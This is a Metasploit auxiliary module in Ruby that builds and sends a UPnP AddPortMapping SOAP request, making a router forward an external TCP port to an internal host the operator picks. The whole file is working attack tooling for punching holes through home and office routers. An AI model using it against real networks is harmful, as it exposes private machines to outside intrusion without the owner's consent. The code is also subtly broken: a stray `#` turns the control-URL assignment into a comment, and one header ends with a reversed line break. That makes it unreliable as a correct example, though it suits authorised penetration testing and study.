##
# encoding: utf-8
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
class Metasploit3 < Msf::Auxiliary
        include Msf::Exploit::Remote::Tcp       

      def initialize                 
          super(                         
                   'Name'           => 'UPnP AddPortMapping',
                   'Version'        => '$Revision: 1 $',
                   'Description'    => 'UPnP AddPortMapping SOAP request',
                   'Author'         => 'St0rn <fabien@anbu-pentest.com>',
                   'License'        => MSF_LICENSE
                )
      register_options(
      [
        OptString.new('CTRL_URL', [ true, 'UPnP Control URL']),
        OptString.new('INTERNAL_CLIENT', [ true, 'New Internal Client']),
        OptInt.new('INTERNAL_PORT', [ true, 'New Internal Port']),
        OptInt.new('EXTERNAL_PORT', [ true, 'New External Port'])
      ], self.class)
        end

        def run()
          ctrlurl = #{datastore['CTRL_URL']}
          soapaction = "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"

          content = "<?xml version=\"1.0\"?>"
          content << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
          content << "<SOAP-ENV:Body>"
     	  content << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
     	  content << "<NewPortMappingDescription>New Port Mapping</NewPortMappingDescription>"
     	  content << "<NewLeaseDuration>3600</NewLeaseDuration>"
     	  content << "<NewInternalClient>#{datastore['INTERNAL_CLIENT']}</NewInternalClient>"
      	  content << "<NewEnabled>1</NewEnabled>"
      	  content << "<NewExternalPort>#{datastore['EXTERNAL_PORT']}</NewExternalPort>"
      	  content << "<NewRemoteHost></NewRemoteHost>"
      	  content << "<NewProtocol>TCP</NewProtocol>"
      	  content << "<NewInternalPort>#{datastore['INTERNAL_PORT']}</NewInternalPort>"
      	  content << "</m:AddPortMapping>"
          content << "</SOAP-ENV:Body>"
          content << "</SOAP-ENV:Envelope>"

          contentlen = content.length

 	  header =  "POST http://#{rhost}:#{rport}/#{ctrlurl} HTTP/1.0\r\n"
 	  header << "Content-Type: text/xml;charset=\"utf-8\"\r\n"
 	  header << "SOAPAction: #{soapaction}\n\r"
 	  header << "User-Agent: SOAP AddPortMapping Metasploit Module\r\n"
 	  header << "Host: #{rhost}:#{rport}\r\n"
 	  header << "Content-Length: #{contentlen}\r\n"
 	  header << "\r\n"
 	  header << content

          print_status("Sending SOAP Request")
          connect()
          sock.puts(header)
          resp=sock.recv(1024)
          if resp.include? "200 OK"
           print_good("PAT added successfully")
          else
           print_error("Fail")
          end
      end
end
